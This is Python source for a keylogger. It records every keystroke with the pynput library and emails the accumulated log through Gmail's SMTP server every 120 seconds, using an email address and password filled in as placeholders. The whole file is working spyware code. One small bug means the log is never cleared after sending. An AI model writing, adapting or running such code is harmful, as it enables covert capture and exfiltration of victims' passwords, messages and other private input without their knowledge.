import pynput.keyboard
import smtplib
import threading
from Keylogger import key_logger

class Keylogger:
    def __init__(self, time_interval, email,password):
        self.log = "keylogger started"
        self.interval = time_interval
        self.email = email
        self.password = password
    def append_to_log(self, string):
        self.log = self.log + string
    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key =  " "
            else:
                current_key =  " " + str(key) + " "
        self.append_to_log(current_key)


    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()
        
        

    def start(self):
        keyboard_listner = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listner:
            self.report()
            keyboard_listner.join()


my_keylogger = key_logger.Keylogger(120, '# Type mail', "# Type password") # set time and email and passsword
my_keylogger.start()